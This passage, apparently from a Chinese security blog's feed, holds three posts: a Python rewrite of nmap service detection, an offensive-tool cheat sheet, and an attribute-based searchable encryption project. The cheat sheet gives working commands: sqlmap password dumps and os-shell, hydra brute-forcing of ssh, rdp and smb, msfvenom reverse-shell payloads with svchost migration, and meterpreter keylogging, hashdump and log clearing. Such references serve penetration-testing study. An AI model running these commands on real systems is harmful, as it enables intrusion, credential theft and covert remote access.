class="built_in">fatal</span>(<span class="string">&quot;Unexpected nsock_loop error.  Error code %d (%s)&quot;</span>, err, <span class="built_in">strerror</span>(err));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">///退出主循环后，删除nsock pool</span></span><br><span class="line">  <span class="built_in">nsp_delete</span>(nsp);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (o.verbose) &#123;</span><br><span class="line">    <span class="type">char</span> additional_info[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">if</span> (SG-&gt;num_hosts_timedout == <span class="number">0</span>)</span><br><span class="line">      <span class="built_in">Snprintf</span>(additional_info, <span class="built_in">sizeof</span>(additional_info), <span class="string">&quot;%u %s on %u %s&quot;</span>,</span><br><span class="line">        (<span class="type">unsigned</span>) SG-&gt;services_finished.<span class="built_in">size</span>(),  </span><br><span class="line">        (SG-&gt;services_finished.<span class="built_in">size</span>() == <span class="number">1</span>)? <span class="string">&quot;service&quot;</span> : <span class="string">&quot;services&quot;</span>,</span><br><span class="line">        (<span class="type">unsigned</span>) Targets.<span class="built_in">size</span>(), (Targets.<span class="built_in">size</span>() == <span class="number">1</span>)? <span class="string">&quot;host&quot;</span> : <span class="string">&quot;hosts&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">Snprintf</span>(additional_info, <span class="built_in">sizeof</span>(additional_info), <span class="string">&quot;%u %s timed out&quot;</span>,</span><br><span class="line">           SG-&gt;num_hosts_timedout,</span><br><span class="line">           (SG-&gt;num_hosts_timedout == <span class="number">1</span>)? <span class="string">&quot;host&quot;</span> : <span class="string">&quot;hosts&quot;</span>);</span><br><span class="line">    SG-&gt;SPM-&gt;<span class="built_in">endTask</span>(<span class="literal">NULL</span>, additional_info);</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// Yeah - done with the service scan.  Now I go through the results</span></span><br><span class="line">  <span class="comment">// discovered, store the important info away, and free up everything</span></span><br><span class="line">  <span class="comment">// else.</span></span><br><span class="line">  <span class="comment">///对服务扫描结果的处理</span></span><br><span class="line">  <span class="built_in">processResults</span>(SG);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">delete</span> SG;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1>3. python重构思路</h1><p>模仿nmap的识别思路，流程如下：</p><ol start="0"><li><p>为了利用 nmap 指纹库方便，先将 nmap-service-probes 转化为一个 json 文件</p></li><li><p>只与端口建立 TCP 连接，不发信息，利用 TCP NULL 探针，根据目标端口返回的 Banner 信息，利用 nmap 指纹库中的正则去匹配返回版本</p></li><li><p>若第一步失败，利用TCP的其他探针，首先判断目标端口是否存在于指纹库一个探针的 ports 列表里，若存在，给端口发送消息（ probestring 中的内容），根据返回回来的消息，用此探针下的各种 matches 正则去匹配，匹配成功，返回该条 match 下的 name ，若都匹配失败，就更换TCP探针，直至匹配成功或全部匹配失败</p></li></ol><div class="center"><img src="/2022/08/29/NMAP-of-Python-refactoring/3-1.png"></div><ol start="3"><li><p>与端口建立 UDP 连接，思路与第二步类似，也是直至其中一个匹配成功或全部匹配失败，在代码实现部分只改变socket连接方式即可</p></li><li><p>应用程序是 SSL 的情况包含在了第二步和第三步当中，将 sslports 字段中的内容也添加进端口列表，看被查询端口是否存在于端口列表中，进而进行探针探查</p></li></ol><h1>4. python重构遇到的问题</h1><h2 id="4-1-已解决">4.1. 已解决</h2><blockquote><p><strong>Q：</strong> socket 与端口建立 TCP 连接后，会一直等待端口返回的消息，若无返回消息，socket 就会一直等到端口主动断连</p></blockquote><p><strong>A：</strong> 使用 socket.settimeout() 函数，等待一段时间后主动断连</p><blockquote><p><strong>Q：</strong> socket 向80端口发送消息，端口不予回应</p></blockquote><p><strong>A：</strong> 第一步：json文件里的 ports 字段用的是<code>80-85</code>端口，对代码有影响；第二步：网上脚本转换成的json文件里，probestring字段的内容会有转义字符，如 <code>\\r\\n\\r\\n</code> ，这些信息在python里转化为 byte 类型后，也会是<code>\\r\\n\\r\\n</code>，这样80端口无法识别报文体，不满足 HTTP 协议，所以不反回消息，将<code>&quot;probestring&quot;: GET / HTTP/1.0\\r\\n\\r\\n</code> 变为 <code>&quot;probestring&quot;: GET / HTTP/1.0\r\n\r\n</code>即可，其他相关的probestring类似</p><blockquote><p><strong>Q：</strong> 有些 probestring 的内容是十六进制，形如<code>&quot;probestring&quot;: &quot;\\x02\\x60&quot;</code>，一旦将转义字符删掉，json文件会报错</p></blockquote><p><strong>A：</strong> 在 python 文件里利用 repr() 和 eval() 函数，将字符串转化后处理，再恢复原始即可</p><h2 id="4-2-未解决">4.2. 未解决</h2><blockquote><p>笔者利用 nmap 的指纹库里的正则去匹配版本号，匹配效果不尽人意，3306 端口会匹配到所有返回消息（包括很多UTF-8无法编码的字符），80 端口会匹配到所有返回报文，笔者只能通过自己写的正则去匹配，但很难做到适用所有情况，只能用如下正则 <code>\d+\.(?:\d+\.)*\d+</code> 去匹配 <code>XX.XX.XX</code> 样式的版本号，非常简陋，所以笔者认为nmap会有其他的操作去处理返回结果，匹配出完整的版本号</p></blockquote><blockquote><p>第二步很多端口无法用探针匹配到，比如25，135，139等，所以第二步的扫描结果是比较失败的，最后一步还是要靠调用 python 的 nmap 库才能完成指定端口的扫描</p></blockquote><h1>5. 实现结果</h1><p><strong><a href="https://github.com/Magi2B0y/NMAP-of-Python-refactoring">https://github.com/Magi2B0y/NMAP-of-Python-refactoring</a></strong></p><hr><h1>参考文章：</h1><p><strong>NMAP原理：</strong></p><p><a href="https://www.codenong.com/cs106947616/">https://www.codenong.com/cs106947616/</a></p><p><a href="https://www.cnblogs.com/liun1994/p/6985796.html">https://www.cnblogs.com/liun1994/p/6985796.html</a></p><p><a href="https://blog.csdn.net/wwl012345/article/details/96427974">https://blog.csdn.net/wwl012345/article/details/96427974</a></p><p><strong>NMAP 指纹库解析：</strong></p><p><a href="https://nmap.org/book/vscan-fileformat.html">https://nmap.org/book/vscan-fileformat.html</a></p><p><a href="https://www.cnblogs.com/liun1994/p/6986544.html">https://www.cnblogs.com/liun1994/p/6986544.html</a></p><p><strong>nmap-service-probes 的JSON转化：</strong></p><p><a href="https://www.cnblogs.com/zpchcbd/p/15221460.html">https://www.cnblogs.com/zpchcbd/p/15221460.html</a></p><p><a href="https://x.hacking8.com/post-418.html">https://x.hacking8.com/post-418.html</a></p><hr><p>ENDฅฅ</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常用攻击工具命令</title>
      <link href="/2022/08/20/Common-attack-tools-Commands/"/>
      <url>/2022/08/20/Common-attack-tools-Commands/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><h1>1. sqlmap</h1><h2 id="1-1-sqlmap注入检测">1.1. sqlmap注入检测</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>GET参数注入</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” <br> sqlmap默认测试所有的GET和POST参数，但可以手动用-p参数设置想要测试的参数。例如：-p “id,user-anget” <br> 当使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数</td></tr><tr><td>POST参数注入</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1”  --data=“id=1” <br> <a href="http://sqlmap.py">sqlmap.py</a> -r “c:\Users\fendo\Desktop\post.txt” -p n --dbs (-r表示加载一个文件，-p指定参数)</td></tr><tr><td>cookie注入 （level&gt;=2时才会检测cookie）</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” --level 2 <br> sqlmap  -r “/root/1.txt” (POST注入过程中，用 * 号指定cookie，这样就可以检测cookie。)</td></tr><tr><td>user-agent注入</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” --level 3 <br> sqlmap  -r “/root/1.txt” (POST注入过程中，用 * 号指定user-agent，这样就可以检测user-agent。)</td></tr><tr><td>referer注入</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” --level 3 <br> sqlmap -r root/1.txt&quot; (POST注入过程中，用 * 号指定referer，这样就可以检测referer。)</td></tr><tr><td>host注入</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” --level 5 <br> sqlmap -r root/1.txt&quot; (POST注入过程中，用 * 号指定referer，这样就可以检测referer。)</td></tr></tbody></table><h2 id="1-2-sqlmap获取数据库信息">1.2. sqlmap获取数据库信息</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>查看数据库</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” --dbs  --batch</td></tr><tr><td>查看数据库里面的表</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” -D security --tables --batch</td></tr><tr><td>查看数据库表里面的列</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” -D security -T users --columns   --batch</td></tr><tr><td>查看数据库列里面的具体的值</td><td>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1” -D security -T users -C password --dump  --batch</td></tr></tbody></table><h2 id="1-3-sqlmap获取shell">1.3. sqlmap获取shell</h2><p>sqlmap -u “http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1”  --os-shell</p><h1>2. nmap</h1><h2 id="2-1-附加参数介绍">2.1. 附加参数介绍</h2><table><thead><tr><th>附加参数</th><th>作用</th></tr></thead><tbody><tr><td>-Pn</td><td>防止NMAP的发送初始数据包到目标机器，不检测主机存活</td></tr><tr><td>-p-</td><td>将扫描所有65535个端口</td></tr><tr><td>-D</td><td>ip地址欺骗 <br>  nmap -D RND:5 <code>ip</code> (RND:为生成随机ip地址)</td></tr><tr><td>-p</td><td>指定端口扫描</td></tr><tr><td>-A</td><td>全面扫描，综合扫描，是一种完整扫描目标信息的扫描方式</td></tr><tr><td>-O</td><td>nmap进行OS探测</td></tr><tr><td>-sS</td><td>TCP、SYN扫描（匿名扫描，默认不加类型，需要root权限，扫描速度快）</td></tr><tr><td>-sT</td><td>TCP全连接扫描（不需要root权限，TCP扫描的默认模式，端口状态和SYN相同，耗时长）</td></tr><tr><td>-sU</td><td>UDP扫描（扫描DNS，SNMP和DHCP等服务，更慢更困难）</td></tr><tr><td>-sI</td><td>用于闲置扫描和发送数据包欺骗</td></tr><tr><td>-sV</td><td>指定nmap进行版本探测</td></tr><tr><td>–version-trace</td><td>显示具体探测细节</td></tr></tbody></table><h2 id="2-2-利用脚本扫描">2.2. 利用脚本扫描</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>默认脚本扫描，主要搜索各种应用服务的信息，收集后，可再针对具体服务进行攻击</td><td>nmap --script=default 192.168.88.131</td></tr><tr><td>检查是否存在常见漏洞</td><td>nmap --script=vuln 192.168.1.104</td></tr><tr><td>提供暴力破解的方式，可对数据库、smb、snmp等进行简单密码的暴力猜解</td><td>nmap --script=brute 192.168.88.131</td></tr><tr><td>利用FTP指定脚本对目标特定FTP协议进行密码爆破</td><td>nmap --script=ftp-brute.nse 192.168.88.131</td></tr><tr><td>利用第三方的数据库或资源，例如进行whoise解析</td><td>nmap --script=external 192.168.88.131</td></tr><tr><td>利用已知的漏洞入侵系统</td><td>exploit</td></tr><tr><td>模糊测试的脚本，发送异常的包到目标机，探测出潜在的漏洞</td><td>fuzzer</td></tr></tbody></table><h1>3. hydra</h1><h2 id="3-1-附加参数介绍">3.1. 附加参数介绍</h2><table><thead><tr><th>附加参数</th><th>作用</th></tr></thead><tbody><tr><td>-l</td><td>小写，指定用户名进行破解</td></tr><tr><td>-L</td><td>大写，指定用户的用户名字典</td></tr><tr><td>-p</td><td>小写，用于指定密码破解，很少使用，一般采用密码字典</td></tr><tr><td>-P</td><td>大写，用于指定密码字典</td></tr><tr><td>-e ns</td><td>额外的选项，n：空密码试探，s：使用指定账户和密码试探</td></tr><tr><td>-M</td><td>指定目标ip列表文件，批量破解</td></tr><tr><td>-o</td><td>指定结果输出文件</td></tr><tr><td>-f</td><td>找到第一对登录名或者密码的时候中止破解</td></tr><tr><td>-t tasks</td><td>同时运行的线程数，默认是16</td></tr><tr><td>-w time</td><td>设置最大超时时间，单位</td></tr><tr><td>-v / -V</td><td>显示详细过程</td></tr><tr><td>-R</td><td>恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）</td></tr><tr><td>-x</td><td>自定义密码</td></tr></tbody></table><h2 id="3-2-爆破">3.2. 爆破</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>破解ssh</td><td>hydra -l 用户名 -p 密码 -t 线程数 -vV -e ns <code>ip</code> ssh <br> hydra -l 用户名 -p 密码 -t 线程数 -o save.log -vV <code>ip</code> ssh</td></tr><tr><td>破解ftp</td><td>hydra -l 用户名 -P 密码 -t 线程(默认16) -vV <code>ip</code> ftp <br> hydra -l 用户名 -P 密码 -e ns -vV <code>ip</code> ftp</td></tr><tr><td>get方式提交，破解web登录</td><td>hydra -l 用户名 -p 密码 -t 线程 -vV -e ns <code>ip</code> http-get /admin/ <br> hydra -l 用户名 -p 密码 -t 线程 -vV -e ns -f <code>ip</code> http-get /admin/index.php</td></tr><tr><td>post方式提交，破解web登录</td><td>hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form “login.php:id=<sup>USER</sup>&amp;passwd=<sup>PASS</sup>: &lt;title&gt; wrong username or password &lt;/title&gt;” <br> （10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解, &lt;title&gt; 中的内容是表示错误猜解的返回信息提示。）</td></tr><tr><td>破解https</td><td>hydra -m /index.php -l muts -P pass.txt 10.36.16.18 https</td></tr><tr><td>破解teamspeak</td><td>hydra -l 用户名 -P 密码 -s 端口号 -vV ip teamspeak</td></tr><tr><td>破解cisco</td><td>hydra -P pass.txt 10.36.16.18 cisco <br> hydra -m cloud -P pass.txt 10.36.16.18 cisco-enable</td></tr><tr><td>破解smb</td><td>hydra -l administrator -P pass.txt 10.36.16.18 smb</td></tr><tr><td>破解pop3</td><td>hydra -l muts -P pass.txt my.pop3.mail pop3</td></tr><tr><td>破解rdp</td><td>hydra ip rdp -l administrator -P pass.txt -V</td></tr><tr><td>破解http-proxy</td><td>hydra -l admin -P pass.txt http-proxy://10.36.16.18</td></tr><tr><td>破解imap</td><td>hydra -L user.txt -p secret 10.36.16.18 imap PLAIN <br> hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</td></tr></tbody></table><h1>4. MSF</h1><h2 id="4-1-普通攻击流程">4.1. 普通攻击流程</h2><blockquote><p>msfconsole</p></blockquote><blockquote><p>search <code>相关漏洞</code></p></blockquote><blockquote><p>use <code>exploit</code></p></blockquote><blockquote><p>show options</p></blockquote><blockquote><p>set LHOST <code>ip</code></p></blockquote><blockquote><p>exploit</p></blockquote><h2 id="4-2-反弹木马">4.2. 反弹木马</h2><blockquote><p><strong>windows32位:</strong> msfvenom -p windows/meterpreter/reverse_tcp LHOST=<code>192.168.223.132</code> LPORT=<code>12345</code> -i 5 -f exe -o ~/桌面/test.exe</p><p><strong>windows64位:</strong> msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<code>192.168.223.132</code> LPORT=<code>12345</code> -i 5 -f exe -o ~/桌面/test.exe</p><p><strong>Linux:</strong> msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<code>x.x.x.x</code> LPORT=<code>5555</code> -a x86 --platform Linux -f elf &gt; shell.elf</p></blockquote><blockquote><p>msfconsole</p></blockquote><blockquote><p>use exploit/multi/handler</p></blockquote><blockquote><p>set payload windows/meterpreter/reverse_tcp</p></blockquote><blockquote><p>set LHOST <code>192.168.1.143</code></p></blockquote><blockquote><p>set LPORT <code>12345</code></p></blockquote><blockquote><p>exploit</p></blockquote><p>当靶机运行test.exe文件后，即可在kali 端获取连接</p><h3 id="4-2-1-msfvenom-参数说明">4.2.1 msfvenom 参数说明</h3><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-p</td><td>指定需要使用的payload(攻击荷载)</td></tr><tr><td>-f</td><td>指定输出格式</td></tr><tr><td>-o</td><td>指定创建好的payload的存放位置</td></tr><tr><td>-i</td><td>指定payload的编码次数</td></tr><tr><td>-a</td><td>指定payload的目标架构，例如x86 还是 x64 还是 x86_64</td></tr><tr><td>–platform</td><td>指定payload的目标平台</td></tr><tr><td>PrependMigrate=true PrependMigrateProc=svchost.exe</td><td>防止太显眼，msfvenom进程migrate，启动两个进程svchost.exe和shell.exe，PrependMigrate=true PrependMigrateProc=svchost.exe将进程默认迁移到svchost.exe中 （也可以写别的进程名）</td></tr></tbody></table><h3 id="4-2-2-meterpreter-一些常用命令">4.2.2. meterpreter 一些常用命令</h3><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>getwd</td><td>当前目录</td></tr><tr><td>dir</td><td>查看所有文件</td></tr><tr><td>cat c:\123.txt</td><td></td></tr><tr><td>search -f cmd.exe</td><td>搜索名为cmd.exe文件所在目录</td></tr><tr><td>upload <code>要上传的文件</code> -&gt; <code>上传到的目录</code></td><td>上传文件</td></tr><tr><td>download <code>要下载的文件</code> <code>要下载的目录</code></td><td>下载文件</td></tr><tr><td>clearev</td><td>清除日志</td></tr><tr><td>getuid</td><td>当前用户</td></tr><tr><td>ps</td><td>查看所用进程</td></tr><tr><td>kill</td><td>杀死某个进程</td></tr><tr><td>sysinfo</td><td>系统信息</td></tr><tr><td>keyscan_start</td><td>开始键盘记录</td></tr><tr><td>keyscan_dump</td><td>查看结果</td></tr><tr><td>keyscan_stop</td><td>停止键盘记录</td></tr><tr><td>screenshot</td><td>屏幕截图</td></tr><tr><td>run vnc</td><td>屏幕监控</td></tr><tr><td>hashdump</td><td>获取密文密码</td></tr><tr><td>shell</td><td>获取shell</td></tr></tbody></table><h4 id="4-2-2-1-windows">4.2.2.1 windows</h4><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>dir</td><td>显示所有文件</td></tr><tr><td>cd</td><td>切换目录</td></tr><tr><td>whoami</td><td>查看当前用户级别</td></tr><tr><td>net user</td><td>查看用户列表</td></tr><tr><td>net user 用户名 密码 /add</td><td>添加用户</td></tr><tr><td>net user 用户名 密码</td><td>更改用户密码</td></tr></tbody></table><h1>5. FOFA</h1><h2 id="使用方法">使用方法</h2><table><thead><tr><th>语法</th><th>功能</th></tr></thead><tbody><tr><td>title=“beijing”</td><td>从标题中搜索“北京”</td></tr><tr><td>domain=“<a href="http://qq.com">qq.com</a>”</td><td>搜索根域名带有qq.com的网站</td></tr><tr><td>host=“<a href="http://qq.com">qq.com</a>”</td><td>搜索host内所有带有qq.com的域名</td></tr><tr><td>ip=“58.63.236.248”</td><td>搜索ip相关信息 <br> 支持ip段搜索： ip=“111.1.1.1/16”</td></tr><tr><td>port=“6379”</td><td>查找对应“6379”端口的资产</td></tr><tr><td>body=”网络空间测绘”</td><td>从html正文中搜索“网络空间测绘”</td></tr><tr><td>header=“elastic”</td><td>从http头中搜索“elastic”</td></tr><tr><td>icp=“京ICP证030173号”</td><td>查找备案号为“京ICP证030173号”的网站，搜索网站类型资产</td></tr><tr><td>cert=“baidu”</td><td>搜索证书(https或者imaps等)中带有baidu的资产</td></tr><tr><td>server==“Microsoft-IIS/10”</td><td>搜索IIS-10服务器</td></tr><tr><td>app=“Microsoft-Exchange”</td><td>搜索Microsoft-Exchange设备</td></tr><tr><td>is_fraud=false</td><td>排除仿冒/欺诈数据</td></tr><tr><td>is_honeypot=false</td><td>排除蜜罐数据，仅限FOFA高级会员使用</td></tr><tr><td>os=“centos”</td><td>搜索操作系统为CentOS资产</td></tr><tr><td>country=“CN”</td><td>搜索指定国家(编码)的资产</td></tr></tbody></table><h1>6. FTP远程连接命令</h1><h2 id="常用命令">常用命令</h2><table><thead><tr><th>功能</th><th>命令</th></tr></thead><tbody><tr><td>连接FTP服务器</td><td>ftp <code>ip</code></td></tr><tr><td>下载文件</td><td>a) get <code>remote-file</code> <code>local-file</code> <br> b) mget <code>remote-files</code></td></tr><tr><td>上传文件</td><td>a) put <code>local-file</code> <code>remote-file</code> <br> b) mput <code>local-files</code></td></tr><tr><td>断开连接</td><td>bye</td></tr></tbody></table><h1>7.</h1>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于属性的可搜索加密</title>
      <link href="/2022/08/13/Attribute-based_searchable_encryption/"/>
      <url>/2022/08/13/Attribute-based_searchable_encryption/</url>
      
        <content type="html"><![CDATA[<style>.center {  width: auto;  display: table;  margin-left: auto;  margin-right: auto;}</style><h1>1. 铺垫知识</h1><h2 id="1-1-基于身份的加密-Identity-Based-Encryption，IBE">1.1 基于身份的加密(Identity-Based Encryption，IBE)</h2><h3 id="1-1-1-概念">1.1.1 概念</h3><p>基于身份加密技术是为了解决公钥加密算法中数字证书管理的困难性而提出的，基于身份加密技术使用用户的身份 ( 如 ID 和邮箱等 ) 作为公钥，由可信的第三方（PKG）产生用户的私钥。基于身份加密技术是一种公钥加密技术，用于指定接收者的身份信息，可实现身份鉴别、消息加密、数字签名和协商会话密钥。</p><h3 id="1-1-2-算法">1.1.2 算法</h3><p>a)系统初始化算法setup。该算法的输入是安全参数k，输出是系统参数params和主密钥msk。该算法由PKG执行。</p><p>b)私钥生成算法keyGen。该算法的输入是params、主密钥msk和身份ID，输出是ID对应的私钥d。该算法由PKG执行。</p><p>c)加密算法encrypt。该算法的输入是params、身份ID和消息M，输出是密文C。该算法由加密者执行。</p><p>d)解密算法decrypt。该算法的输入是params、密文C和私钥d，输出是消息M。该算法由解密者执行。</p><h2 id="1-2-基于角色的访问控制-Role-Based-Access-Control，RBA">1.2 基于角色的访问控制(Role-Based Access Control，RBA)</h2><h3 id="1-2-1-概念">1.2.1 概念</h3><p>基于角色的访问控制，就是用户通过角色与权限进行关联。简单地说，一个用户拥有若干角色，每一个角色拥有若干权限。这样，就构造成“用户-角色-权限”的授权模型。在这种模型中，用户与角色之间，角色与权限（功能）之间，一般都是多对多的关系。</p><h2 id="1-3-基于属性的加密-Attribute-based-encryption，ABE">1.3 基于属性的加密(Attribute-based encryption，ABE)</h2><h3 id="1-3-1-概念">1.3.1 概念</h3><p>2006年，Goyal V, Pandey A, Sahai A, Waters B在the 13th ACM Conf. on Computer and Communications Security会议上提出了基于属性加密的概念， Sahai A, Waters B提出了第一个基于属性加密方案。其概念如下图所示：</p><div class="center"><img src="/2022/08/13/Attribute-based_searchable_encryption/1-3-1.png"></div><p>数据拥有者需要制定一条仅有这n个用户才能满足的访问策略，接着输入公共参数PP、该条策略以及明文文件至ABE加密算法，进行加密一次，形成唯一一份密文。得到密文后，数据拥有者将该份密文分别发送给n个不同的用户。</p><h3 id="1-3-2-KP-ABE方案">1.3.2 KP-ABE方案</h3><p>KP-ABE（Key Policy Attribute-based Encryption，基于密钥策略的属性加密）方案是将策略嵌入到密钥中，属性嵌入到密文中，密钥对应于一个访问结构而密文对应于一个属性集合，解密当且仅当属性集合中的属性能够满足此访问策略。这种设计比较接近静态场景，此时密文用与其相关的属性加密存放在服务器上，当允许用户得到某些消息时，就分配一个特定的访问策略给用户，其应用场景则更加偏向于付费视频网站、日志加密管理等等。如果用户想解密多个文件，那么他必须拥有多个可以满足匹配的秘钥，否则不能解密多个文件。其包含一下四个算法：</p><ul><li><strong>Setup(γ,U)</strong>：以安全参数γ和属性全集U作为输入，初始化系统并生成系统公共参数pk及主密钥mk；</li><li><strong>KeyGen(pk,mk,T)</strong>：以系统公共参数pk、主密钥mk以及用户的访问策略T为输入，输出与T对应的用户私钥SKT；</li><li><strong>Encrypt(pk,w,m)</strong>：以系统公共参数pk、属性集合w以及明文m为输入，输出密文CTw；</li><li><strong>Decrypt(pk,SKT,CTw)</strong>：以系统公共参数pk、用户私钥SKT及密文CTw为输入，当且仅当CTw对应的属性集合w满足SKT对应的访问控制策略T时，算法输出明文m。</li></ul><h3 id="1-3-3-CP-ABE">1.3.3 CP-ABE</h3><p>CP-ABE（Ciphertext Policy Attribute-based Encryption，基于密文策略的属性加密），是将策略嵌入到密文中，属性嵌入到密钥中，CP-ABE由于策略嵌入密文中，这就意味着数据拥有者可以通过设定策略去决定拥有哪些属性的人能够访问这份密文，也就相当于对这份数据做了一个粒度可以细化到属性级别的加密访问控制，CP-ABE的应用场景一般是公有云上的数据加密存储与细粒度共享。其包含一下四个算法：</p><ul><li><strong>Setup(γ,U)</strong>：以安全参数γ和属性全集U作为输入，输出系统公共参数pk及主密钥mk；</li><li><strong>KeyGen(pk,mk,w)</strong>：输入系统公共参数pk、主密钥mk以及用户属性集合w，输出与w对应的用户私钥SKw；</li><li><strong>Encrypt(pk,T,m)</strong>：以系统公共参数pk、访问控制策略T以及明文m为输入，输出密文CTT；</li><li><strong>Decrypt(pk,SKw,CTT)</strong>：以系统公共参数pk、用户私钥SKw及密文CTT为输入，当且仅当SKw对应的属性集合w满足CTT对应的访问控制策略T时，输出明文m。</li></ul><h1>2. 基于属性的可搜索加密（内嵌CP-ABE模块）</h1><p><strong>项目地址</strong>：<a href="https://github.com/Magi2B0y/Attribute-Based-Searchable-Encryption">https://github.com/Magi2B0y/Attribute-Based-Searchable-Encryption</a></p><p><strong>网络业务整体运行流程图</strong>：</p><div class="center"><img src="/2022/08/13/Attribute-based_searchable_encryption/2.png"></div><p><strong>流程说明</strong>：</p><ol><li><p>文件上传者将要加密的文件列表、文件索引、文件访问策略和全网属性上传，生成加密后的文件索引和文件密文，将这些内容上传网络，形成倒排索引</p></li><li><p>文件搜索者将自身属性、搜索关键词和全网属性上传，生成搜索 token 文件交给网络节点</p></li><li><p>网络节点拿到文件搜索者上传的搜索 token 文件，对倒排索引表的加密后的文件索引一一检索，若成功检索到，就将对应的密文文件返回给文件搜索者</p></li><li><p>文件搜索者利用自身属性对密文进行解密</p></li></ol><h3 id="PubAndMskGenerate-jar">PubAndMskGenerate.jar</h3><p><strong>命令行</strong>：<code>java -jar PubAndMskGenerate.jar -a &quot;ECNU teacher doctor master bachelor 2016 2015 2014&quot;</code></p><div class="center"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-a</td><td>全网所有的属性</td></tr></tbody></table></div><p><strong>运行结果</strong>：<br>每次只有要更新全网所有属性时，需要运行PubAndMskGenerate.jar生成新的可搜索加密的公钥（./SerializedData/SearchableEncryption/Pub.ser）和主密钥（./SerializedData/SearchableEncryption/Msk.ser）重新分发给全网，目前全网属性是<code>ECNU teacher doctor master bachelor 2016 2015 2014</code></p><h3 id="FilesUploader-jar">FilesUploader.jar</h3><p><strong>命令行</strong>：<code>java -jar FilesUploader.jar -a &quot;ECNU teacher doctor master bachelor 2016 2015 2014&quot; -p &quot;ECNU teacher&quot; -i &quot;4&quot; -f &quot;E:/DeskDocument/Application_Layer/SourceFiles/1.txt&quot;</code></p><div class="center"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-a</td><td>全网所有的属性</td></tr><tr><td>-p</td><td>文件上传者定义的文件访问策略</td></tr><tr><td>-i</td><td>上传一条倒排索引的索引值（只上传一个关键词）</td></tr><tr><td>-f</td><td>上传一条倒排索引的文件列表</td></tr></tbody></table></div><p><strong>运行结果</strong>：</p><ol><li><p>在与FilesUploader.jar同一目录下的 SerializedData/SearchableEncryption 生成 InvertedIndex.ser 这个加密索引</p></li><li><p>将要上传的文件进行加密，放在 ./UploadFiles 目录下</p></li></ol><h3 id="FilesSeacher-jar">FilesSeacher.jar</h3><p><strong>命令行</strong>： <code>java -jar FilesSeacher.jar -a &quot;ECNU teacher doctor master bachelor 2016 2015 2014&quot; -s &quot;ECNU teacher&quot; -w &quot;4&quot;</code></p><div class="center"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-a</td><td>全网所有的属性</td></tr><tr><td>-s</td><td>文件搜索者自身拥有的属性</td></tr><tr><td>-w</td><td>搜索关键词（只搜索一个关键词）</td></tr></tbody></table></div><p><strong>运行结果</strong>：<br>在 SerializedData/SearchableEncryption 目录下生成文件搜索者的 UserToken.ser，后续将其发送给网络节点执行搜索操作</p><h3 id="NodeSeach-jar">NodeSeach.jar</h3><p><strong>命令行</strong>： <code>java -jar NodeSearch.jar</code></p><p><strong>运行结果</strong>：<br>用户上传的 UserToken.ser 若可以查找到 InvertedIndex.ser，返回 have found；否则，返回 not found，若返回 have found，网络节点就可以把该条索引对应的密文文件返回给文件搜索者</p><h3 id="DecFiles-jar">DecFiles.jar</h3><p><strong>命令行</strong>： <code>java -jar DecFiles.jar -s &quot;ECNU teacher&quot; -e &quot;./DownloadFiles/1.txt&quot;</code></p><div class="center"><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>-s</td><td>文件搜索者自身拥有的属性</td></tr><tr><td>-e</td><td>加密文件路径（不止一个）</td></tr></tbody></table></div><p><strong>运行结果</strong>：<br>文件搜索者接收到的密文文件放置在 ./DownloadFiles 目录下，将密文文件进行解密，明文文件放在 ./PlainFiles 目录下</p><hr><h1>参考文章：</h1><p><a href="https://blog.csdn.net/qq_40279192/article/details/120970286">https://blog.csdn.net/qq_40279192/article/details/120970286</a></p><p><a 